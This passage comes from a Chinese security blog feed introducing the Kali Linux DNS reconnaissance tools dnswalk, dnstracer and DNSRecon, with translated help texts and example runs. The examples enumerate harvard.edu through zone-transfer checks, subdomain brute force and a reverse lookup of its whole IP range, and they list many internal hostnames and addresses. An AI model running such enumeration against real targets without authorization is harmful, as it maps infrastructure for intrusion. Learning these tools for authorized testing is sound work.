      <content type="html"><![CDATA[<h2 id="0x00-dnswalk介绍"><a href="#0x00-dnswalk介绍" class="headerlink" title="0x00 dnswalk介绍"></a>0x00 dnswalk介绍</h2><p>dnswalk是一个DNS调试器，它执行指定域的传送，并以多种方式检查数据库内部一致性以及准确性。</p><p>工具来源：<a href="http://sourceforge.net/projects/dnswalk/" target="_blank" rel="external">http://sourceforge.net/projects/dnswalk/</a></p><p><a href="http://sourceforge.net/projects/dnswalk/" target="_blank" rel="external">dnstracer主页</a> | <a href="http://tools.kali.org/information-gathering/dnswalk" target="_blank" rel="external">Kali dnstracer Repo仓库</a></p><ul><li>作者：David Barr</li><li>证书：Artistic</li></ul><h2 id="0x01-dnswalk功能"><a href="#0x01-dnswalk功能" class="headerlink" title="0x01 dnswalk功能"></a>0x01 dnswalk功能</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnswalk --help</div><div class="line"></div><div class="line">用法: dnswalk [-选项[-更多选项]] [--] [程序参数1 ...]</div><div class="line"></div><div class="line">接受以下单字符选项:</div><div class="line">该选项有参数: -D</div><div class="line">布尔型(没有参数): -r -f -i -a -d -m -F -l</div><div class="line"></div><div class="line">选项可以合并在一起，--stop选项不做合并处理</div><div class="line">选项及其参数之间不需要空</div><div class="line"></div><div class="line">示例: dnswalk domain.com.</div><div class="line">输入的域名必须以'.'结束</div></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-r     递归向下查询指定域的子域</div><div class="line">-a     打开重复A记录的警告</div><div class="line">-d     打印调试和'状态'信息到stderr（仅在重定向stdout时使用）</div><div class="line">-m     仅在上次运行后域已被修改时才执行检查</div><div class="line">-F     执行"fascist"检查，在检查A记录时，不匹配每个IP地址的PTR名称与转发名称和报告</div><div class="line">-i     禁止检查域名中的无效字符</div><div class="line">-l     执行"lame delegation"检查。 对于每个NS记录，检查列出的主机是否确实是此域返回的权威答应。</div></pre></td></tr></table></figure><h2 id="0x02-dnswalk用法示例"><a href="#0x02-dnswalk用法示例" class="headerlink" title="0x02 dnswalk用法示例"></a>0x02 dnswalk用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnswalk www.harvard.edu.</div><div class="line">Checking www.harvard.edu.</div><div class="line">BAD: SOA record not found for www.harvard.edu.</div><div class="line">BAD: www.harvard.edu. has NO authoritative nameservers!</div><div class="line">BAD: All zone transfer attempts of www.harvard.edu. failed!</div><div class="line">0 failures, 0 warnings, 3 errors.</div></pre></td></tr></table></figure><p>现在大多都没有域传送的漏洞了，这个工具现在比较鸡肋。</p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> dns </tag>
            
            <tag> dnswalk </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之dnstracer]]></title>
      <url>/2016/10/21/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bdnstracer/</url>
      <content type="html"><![CDATA[<h2 id="0x00-dnstracer介绍"><a href="#0x00-dnstracer介绍" class="headerlink" title="0x00 dnstracer介绍"></a>0x00 dnstracer介绍</h2><p>dnstracer用于获取给定主机名从给定域名服务器（DNS）的信息，并跟随DNS服务器链得到权威结果。</p><p>工具来源：<a href="http://www.mavetju.org/unix/general.php" target="_blank" rel="external">http://www.mavetju.org/unix/general.php</a></p><p><a href="http://freshmeat.net/projects/dnstracer" target="_blank" rel="external">dnstracer主页</a> | <a href="http://freshmeat.net/projects/dnstracer" target="_blank" rel="external">Kali dnstracer Repo仓库</a></p><ul><li>作者：Edwin Groothuis</li><li>证书：BSD</li></ul><h2 id="0x01-dnstracer功能"><a href="#0x01-dnstracer功能" class="headerlink" title="0x01 dnstracer功能"></a>0x01 dnstracer功能</h2><p>dnstracer - 跟踪到源的DNS查询工具<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnstracer </div><div class="line">DNSTRACER version 1.8.1 - (c) Edwin Groothuis - http://www.mavetju.org</div><div class="line">用法: dnstracer [选项] [主机名]</div><div class="line">	-c:                     禁用本地缓存,默认启用</div><div class="line">	-C:                     启用负缓存，默认禁用</div><div class="line">	-o:                     启用返回结果的概述，默认禁用</div><div class="line">	-q &lt;querytype&gt;:         DNS请求查询类型，默认为A</div><div class="line">	-r &lt;retries&gt;:           DNS请求的重试次数，默认值3</div><div class="line">	-s &lt;server&gt;:            使用此服务器的初始请求，默认localhost，如果指定将使用A.ROOT-SERVERS.NET</div><div class="line">	-t &lt;maximum timeout&gt;:   限制每次尝试等待的时间</div><div class="line">	-v:                     显示详细</div><div class="line">	-S &lt;ip address&gt;:        使用这个IP作为源地址</div><div class="line">	-4:                     不查询IPv6服务器</div></pre></td></tr></table></figure><p></p><a id="more"></a><h2 id="0x02-dnstracer用法示例"><a href="#0x02-dnstracer用法示例" class="headerlink" title="0x02 dnstracer用法示例"></a>0x02 dnstracer用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnstracer -q mx -r 1 -t 10 -v www.harvard.edu</div><div class="line">Tracing to www.harvard.edu[#mx] via 192.168.219.2, maximum of 1 retries</div><div class="line">192.168.219.2 (192.168.219.2) IP HEADER</div><div class="line">- Destination address:  192.168.219.2</div><div class="line">DNS HEADER (send)</div><div class="line">- Identifier:           0x351F</div><div class="line">- Flags:                0x00 (Q )</div><div class="line">- Opcode:               0 (Standard query)</div><div class="line">- Return code:          0 (No error)</div><div class="line">- Number questions:     1</div><div class="line">- Number answer RR:     0</div><div class="line">- Number authority RR:  0</div><div class="line">- Number additional RR: 0</div><div class="line">QUESTIONS (send)</div><div class="line">- Queryname:            (3)www(7)harvard(3)edu</div><div class="line">- Type:                 15 (unknown)</div><div class="line">- Class:                1 (Internet)</div><div class="line">DNS HEADER (recv)</div><div class="line">- Identifier:           0x351F</div><div class="line">- Flags:                0x8080 (R RA )</div><div class="line">- Opcode:               0 (Standard query)</div><div class="line">- Return code:          0 (No error)</div><div class="line">- Number questions:     1</div><div class="line">- Number answer RR:     1</div><div class="line">- Number authority RR:  5</div><div class="line">- Number additional RR: 4</div><div class="line">QUESTIONS (recv)</div><div class="line">- Queryname:            (3)www(7)harvard(3)edu</div><div class="line">- Type:                 15 (unknown)</div><div class="line">- Class:                1 (Internet)</div><div class="line">ANSWER RR</div><div class="line">- Domainname:           (3)www(7)harvard(3)edu</div><div class="line">- Type:                 5 (CNAME)</div><div class="line">- Class:                1 (Internet)</div><div class="line">- TTL:                  5 (5s)</div><div class="line">- Resource length:      36</div><div class="line">- Resource data:        (3)www(7)harvard(3)edu(3)cdn(10)cloudflare(3)net</div><div class="line">AUTHORITY RR</div><div class="line">- Domainname:           (10)cloudflare(3)net</div><div class="line">- Type:                 2 (NS)</div><div class="line">- Class:                1 (Internet)</div><div class="line">- TTL:                  5 (5s)</div><div class="line">- Resource length:      6</div><div class="line">- Resource data:        (3)ns3(10)cloudflare(3)net</div><div class="line">AUTHORITY RR</div><div class="line">- Domainname:           (10)cloudflare(3)net</div><div class="line">- Type:                 2 (NS)</div><div class="line">- Class:                1 (Internet)</div><div class="line">- TTL:                  5 (5s)</div><div class="line">- Resource length:      6</div><div class="line">- Resource data:        (3)ns2(10)cloudflare(3)net</div><div class="line">AUTHORITY RR</div><div class="line">- Domainname:           (10)cloudflare(3)net</div><div class="line">- Type:                 2 (NS)</div><div class="line">- Class:                1 (Internet)</div><div class="line">- TTL:                  5 (5s)</div><div class="line">- Resource length:      6</div><div class="line">- Resource data:        (3)ns1(10)cloudflare(3)net</div><div class="line">AUTHORITY RR</div><div class="line">- Domainname:           (10)cloudflare(3)net</div><div class="line">- Type:                 2 (NS)</div><div class="line">- Class:                1 (Internet)</div><div class="line">- TTL:                  5 (5s)</div><div class="line">- Resource length:      6</div><div class="line">- Resource data:        (3)ns5(10)cloudflare(3)net</div><div class="line">AUTHORITY RR</div><div class="line">- Domainname:           (10)cloudflare(3)net</div><div class="line">- Type:                 2 (NS)</div><div class="line">- Class:                1 (Internet)</div><div class="line">- TTL:                  5 (5s)</div><div class="line">- Resource length:      6</div><div class="line">- Resource data:        (3)ns4(10)cloudflare(3)net</div><div class="line">ADDITIONAL RR</div><div class="line">- Domainname:           (3)ns3(10)cloudflare(3)net</div><div class="line">- Type:                 28 (unknown)</div><div class="line">- Class:                1 (Internet)</div><div class="line">- TTL:                  5 (5s)</div><div class="line">- Resource length:      16</div><div class="line">- Resource data:        2400:cb00:2049:0001:0000:0000:c629:de1f</div><div class="line">ADDITIONAL RR</div><div class="line">- Domainname:           (3)ns3(10)cloudflare(3)net</div><div class="line">- Type:                 1 (A)</div><div class="line">- Class:                1 (Internet)</div><div class="line">- TTL:                  5 (5s)</div><div class="line">- Resource length:      4</div><div class="line">- Resource data:        198.41.222.31</div><div class="line">ADDITIONAL RR</div><div class="line">- Domainname:           (3)ns2(10)cloudflare(3)net</div><div class="line">- Type:                 28 (unknown)</div><div class="line">- Class:                1 (Internet)</div><div class="line">- TTL:                  5 (5s)</div><div class="line">- Resource length:      16</div><div class="line">- Resource data:        2400:cb00:2049:0001:0000:0000:c629:de83</div><div class="line">ADDITIONAL RR</div><div class="line">- Domainname:           (3)ns2(10)cloudflare(3)net</div><div class="line">- Type:                 1 (A)</div><div class="line">- Class:                1 (Internet)</div><div class="line">- TTL:                  5 (5s)</div><div class="line">- Resource length:      4</div><div class="line">- Resource data:        198.41.222.131</div><div class="line">Got answer [received type is cname] </div><div class="line"> |\___ ns3.cloudflare.net [cloudflare.net] (2400:cb00:2049:0001:0000:0000:c629:de1f) IP HEADER</div><div class="line">- Destination address:  XXX</div><div class="line">DNS HEADER (send)</div><div class="line">- Identifier:           0x303A</div><div class="line">- Flags:                0x00 (Q )</div><div class="line">- Opcode:               0 (Standard query)</div><div class="line">- Return code:          0 (No error)</div><div class="line">- Number questions:     1</div><div class="line">- Number answer RR:     0</div><div class="line">- Number authority RR:  0</div><div class="line">- Number additional RR: 0</div><div class="line">QUESTIONS (send)</div><div class="line">- Queryname:            (3)www(7)harvard(3)edu</div><div class="line">- Type:                 15 (unknown)</div><div class="line">- Class:                1 (Internet)</div><div class="line">send_data/sendto: Network is unreachable</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> dns </tag>
            
            <tag> dnstracer </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之DNSRecon]]></title>
      <url>/2016/10/21/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BDNSRecon/</url>
      <content type="html"><![CDATA[<h2 id="0x00-DNSRecon介绍"><a href="#0x00-DNSRecon介绍" class="headerlink" title="0x00 DNSRecon介绍"></a>0x00 DNSRecon介绍</h2><p>DNSRecon提供一下功能：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">检查域传送的所有NS记录</div><div class="line">枚举给定域的一般DNS记录（MX，SOA，NS，A，AAAA，SPF和TXT）</div><div class="line">执行常见的SRV记录枚举，顶级域名（TLD）扩展</div><div class="line">支持通配符</div><div class="line">蛮力穷举给定一个域和一个域名列表子域和主机A记录和AAAA记录</div><div class="line">对给定的IP范围或CIDR执行PTR记录查找</div><div class="line">检查DNS服务器A，AAAA和CNAME记录的缓存记录</div><div class="line">枚举本地网络中的常见mDNS记录枚举主机并使用Google搜索子域</div></pre></td></tr></table></figure><p></p><p>工具来源： DNSRecon README</p><p><a href="https://github.com/darkoperator/dnsrecon" target="_blank" rel="external">DNSRecon 主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/dnsrecon.git;a=summary" target="_blank" rel="external">Kali DNSRecon Repo仓库</a></p><ul><li>作者：Carlos Perez</li><li>证书：GPLv2</li></ul><p><a href="https://asciinema.org/a/31190" target="_blank" rel="external">DNSRecon视频介绍</a></p><h2 id="0x01-DNSRecon功能"><a href="#0x01-DNSRecon功能" class="headerlink" title="0x01 DNSRecon功能"></a>0x01 DNSRecon功能</h2><p>dnsrecon - 一个强大的DNS枚举脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">选项:</div><div class="line"></div><div class="line">-n, --name_server </div><div class="line">-D, --dictionary </div><div class="line">-f 过滤掉保存记录时解析为通配符定义的IP地址</div><div class="line">root@kali:~# dnsrecon </div><div class="line">Version: 0.8.10</div><div class="line">Usage: dnsrecon.py &lt;options&gt;</div><div class="line"></div><div class="line">Options:</div><div class="line">   -h, --help                   显示帮助信息并退出</div><div class="line">   -d, --domain      &lt;domain&gt;   枚举的域目标</div><div class="line">   -r, --range       &lt;range&gt;    用于蛮力穷举反向查找IP范围，形式可以为（开始IP-结束IP）或（范围/掩码）</div><div class="line">   -n, --name_server &lt;name&gt;     要使用域服务器，如果没有给定将使用目标的SOA</div><div class="line">   -D, --dictionary  &lt;file&gt;     用于蛮力穷举子域和主机名的字典文件。</div><div class="line">   -f                           过滤掉穷举域查找结果，保存记录时解析到通配符定义的IP地址的记录</div><div class="line">   -t, --type        &lt;types&gt;    枚举类型:</div><div class="line">                                std       查询SOA，DNS，A，AAAA，MX和SRV记录（如果NS服务器的AXFR请求失败）</div><div class="line">                                rvl       反向查找给定CIDR或IP范围</div><div class="line">                                brt       使用给定字典文件蛮力穷举域名和主机</div><div class="line">                                srv       SRV记录</div><div class="line">                                axfr      测试所有NS服务器的域传送</div><div class="line">                                goo       Google搜索子域和主机</div><div class="line">                                snoop     对给定域的所有NS服务器执行缓存侦听，使用包含域的文件测试所有的服务器，                  使用-D选项提供文件</div><div class="line">                                tld       删除给定域的TLD并针对在IANA中注册的所有TLD进行测试</div><div class="line">                                zonewalk  使用NSEC记录执行DNSSEC域漫游</div><div class="line">   -a                           执行AXFR进行标准枚举</div><div class="line">   -s                           使用标准枚举对SPF记录中的IPv4范围执行反向查找。</div><div class="line">   -g                           通过Google搜索执行标准的枚举</div><div class="line">   -w                           在进行标准枚举时，通过Whois执行深度whois记录分析和反向查找IP范围</div><div class="line">   -z                           使用标准枚举形式执行DNSSEC域漫游</div><div class="line">   --threads         &lt;number&gt;   在反向查找，正向查找，强力和SRV记录枚举中使用的线程数</div><div class="line">   --lifetime        &lt;number&gt;   等待服务器响应查询的时间</div><div class="line">   --db              &lt;file&gt;     使用SQLite3文件格式保存找到的记录</div><div class="line">   --xml             &lt;file&gt;     使用XML文件格式保存找到的记录</div><div class="line">   --iw                         继续蛮力穷举域，即使发现通配符记录。</div><div class="line">   -c, --csv         &lt;file&gt;     csv格式文件</div><div class="line">   -j, --json        &lt;file&gt;     JSON格式文件</div><div class="line">   -v                           在穷举模式中显示尝试详细</div></pre></td></tr></table></figure><a id="more"></a><h2 id="0x02-DNSRecon用法示例"><a href="#0x02-DNSRecon用法示例" class="headerlink" title="0x02 DNSRecon用法示例"></a>0x02 DNSRecon用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dnsrecon -d harvard.edu -D /usr/share/wordlists/dnsmap.txt  -t std -w --threads=10 --lifetime=20 --xml=test.xml -v</div><div class="line">[*] Performing General Enumeration of Domain:</div><div class="line">[-] DNSSEC is not configured for harvard.edu</div><div class="line">[*] 	 SOA int-dns-2.harvard.edu 128.103.201.105</div><div class="line">[*] 	 NS ext-dns-1.harvard.edu 128.103.200.35</div><div class="line">[-] 	 Recursion enabled on NS Server 128.103.200.35</div><div class="line">[*] 	 NS ext-dns-2.harvard.edu 128.103.200.162</div><div class="line">[-] 	 Recursion enabled on NS Server 128.103.200.162</div><div class="line">[*] 	 MX mx0b-00171101.pphosted.com 67.231.156.27</div><div class="line">[*] 	 A harvard.edu 52.87.36.185</div><div class="line">[*] 	 A harvard.edu 52.87.67.209</div><div class="line">[*] Enumerating SRV Records</div><div class="line">[*] 	 SRV _sip._tls.harvard.edu sipdir.online.lync.com 66.119.157.212 443 0</div><div class="line">[*] 	 SRV _sip._tls.harvard.edu sipdir.online.lync.com 2603:1047:0:2::b 443 0</div><div class="line">[*] 	 SRV _sipfederationtls._tcp.harvard.edu sipfed.online.lync.com 52.113.64.139 5061 0</div><div class="line">[*] 	 SRV _sipfederationtls._tcp.harvard.edu sipfed.online.lync.com 2603:1047:0:2::b 5061 0</div><div class="line">[*] 	 SRV _h323cs._tcp.harvard.edu vcsecluster01.noc.harvard.edu 128.103.247.202 1720 0</div><div class="line">[*] 	 SRV _h323cs._tcp.harvard.edu vcsecluster01.noc.harvard.edu 128.103.247.201 1720 0</div><div class="line">[*] 	 SRV _sip._udp.harvard.edu vcsecluster01.noc.harvard.edu no_ip 5060 0</div><div class="line">[*] 	 SRV _sips._tcp.harvard.edu harvuni-expe01-sc1.uc.harvard.edu no_ip 5061 10</div><div class="line">[*] 	 SRV _sips._tcp.harvard.edu harvuni-expe01-bv1.uc.harvard.edu 63.69.76.6 5061 10</div><div class="line">[*] 9 Records Found</div><div class="line">[*] Performing Whois lookup against records found.</div><div class="line">[*] The following IP Ranges where found:</div><div class="line">[*] 	 0) 128.103.0.0-128.103.255.255 Harvard University</div><div class="line">[*] 	 1) 67.231.144.0-67.231.159.255 Proofpoint, Inc.</div><div class="line">[*] 	 2) 52.84.0.0-52.95.255.255 Amazon Technologies Inc.</div><div class="line">[*] 	 3) 66.119.144.0-66.119.159.255 Microsoft Corporation</div><div class="line">[*] 	 4) 52.96.0.0-52.115.255.255 Microsoft Corporation</div><div class="line">[*] 	 5) 63.69.76.0-63.69.77.255 Logistics Management Institute</div><div class="line">[*] What Range do you wish to do a Revers Lookup for?</div><div class="line">[*] number, comma separated list, a for all or n for none</div><div class="line">0</div><div class="line">[*] Harvard University</div><div class="line">[*] Performing Reverse Lookup of range 128.103.0.0-128.103.255.255</div><div class="line">[*] Performing Reverse Lookup from 128.103.0.0 to 128.103.255.255</div><div class="line">[*] 	 PTR lmagw1-te-7-3-core.nox.org 128.103.0.74</div><div class="line">[*] 	 PTR int-dns-3.harvard.edu 128.103.1.5</div><div class="line">[*] 	 PTR endrun2-10wa.noc.harvard.edu 128.103.1.6</div><div class="line">[*] 	 PTR time.harvard.edu 128.103.1.6</div><div class="line">[*] 	 PTR internaldns-b3-n2.harvard.edu 128.103.1.10</div><div class="line">[*] 	 PTR internaldns-b3-n2-ha.harvard.edu 128.103.1.11</div><div class="line">[*] 	 PTR int-dns-3-node1.harvard.edu 128.103.1.12</div><div class="line">[*] 	 PTR int-dns-3-node1-ha.harvard.edu 128.103.1.13</div><div class="line">[*] 	 PTR int-dns-3-node2.harvard.edu 128.103.1.14</div><div class="line">[*] 	 PTR vpn.noc.harvard.edu 128.103.1.20</div><div class="line">[*] 	 PTR vpn5.harvard.edu 128.103.1.20</div><div class="line">[*] 	 PTR time.harvard.edu 128.103.1.35</div><div class="line">[*] 	 PTR endrun3-10wa.noc.harvard.edu 128.103.1.35</div><div class="line">[*] 	 PTR netopc.harvard.edu 128.103.1.37</div><div class="line">[*] 	 PTR registration.noc.harvard.edu 128.103.1.38</div><div class="line">[*] 	 PTR registration-10wa.noc.harvard.edu 128.103.1.38</div><div class="line">[*] 	 PTR usedby-reg10wa.noc.harvard.edu 128.103.1.39</div><div class="line">[*] 	 PTR new-netopc.harvard.edu 128.103.1.40</div><div class="line">[*] 	 PTR test.noc.harvard.edu 128.103.1.42</div><div class="line">[*] 	 PTR sms.noc.harvard.edu 128.103.1.44</div><div class="line">[*] 	 PTR autoregdev1-10wa.noc.harvard.edu 128.103.1.45</div><div class="line">[*] 	 PTR portaldb2.noc.harvard.edu 128.103.1.46</div><div class="line">[*] 	 PTR ext2-10wa.noc.harvard.edu 128.103.1.48</div><div class="line">[*] 	 PTR portaldb1-10wa.noc.harvard.edu 128.103.1.51</div><div class="line">[*] 	 PTR jnc-10wa.noc.harvard.edu 128.103.1.56</div><div class="line">[*] 	 PTR rest-dev.noc.harvard.edu 128.103.1.61</div><div class="line">[*] 	 PTR cdn-war10.noc.harvard.edu 128.103.1.133</div><div class="line">[*] 	 PTR int-dns-3-node1-mgmt.harvard.edu 128.103.1.178</div><div class="line">[*] 	 PTR int-dns-3-node2-mgmt.harvard.edu 128.103.1.179</div><div class="line">[*] 	 PTR int-dns-1-node2-mgmt.harvard.edu 128.103.1.195</div><div class="line">[*] 	 PTR dhcp-1.harvard.edu 128.103.1.210</div><div class="line">[*] 	 PTR dhcp-1-node1.harvard.edu 128.103.1.211</div><div class="line">[*] 	 PTR dhcp-1-node1-ha.harvard.edu 128.103.1.212</div><div class="line">[*] 	 PTR dhcp-1-node2.harvard.edu 128.103.1.213</div><div class="line">[*] 	 PTR dhcp-2.harvard.edu 128.103.1.242</div><div class="line">[*] 	 PTR dhcp-2-node1.harvard.edu 128.103.1.243</div><div class="line">[*] 	 PTR dhcp-2-node1-ha.harvard.edu 128.103.1.244</div><div class="line">[*] 	 PTR dhcp-2-node2.harvard.edu 128.103.1.245</div><div class="line">[*] 	 PTR dhcp-2-node2-ha.harvard.edu 128.103.1.246</div><div class="line">[*] 	 PTR perdita.harvard.edu 128.103.4.2</div><div class="line">[*] 	 PTR iceberg.harvard.edu 128.103.4.3</div><div class="line">[*] 	 PTR camelot.harvard.edu 128.103.4.4</div><div class="line">[*] 	 PTR paradise.harvard.edu 128.103.4.7</div><div class="line">[*] 	 PTR intrigue.harvard.edu 128.103.4.8</div><div class="line">[*] 	 PTR mikado.harvard.edu 128.103.4.9</div><div class="line">[*] 	 PTR olympiad.harvard.edu 128.103.4.10</div><div class="line">[*] 	 PTR tempo.harvard.edu 128.103.4.12</div><div class="line">[*] 	 PTR peace.harvard.edu 128.103.4.11</div><div class="line">[*] 	 PTR tuscany.harvard.edu 128.103.4.16</div><div class="line">[*] 	 PTR troika.harvard.edu 128.103.4.21</div><div class="line">[*] 	 PTR pilgrim.harvard.edu 128.103.4.23</div><div class="line">[*] 	 PTR broadway.harvard.edu 128.103.4.24</div><div class="line">[*] 	 PTR gypsy.harvard.edu 128.103.4.25</div><div class="line">[*] 	 PTR winnie2.harvard.edu 128.103.4.26</div><div class="line">[*] 	 PTR altissimo.harvard.edu 128.103.4.31</div><div class="line">[*] 	 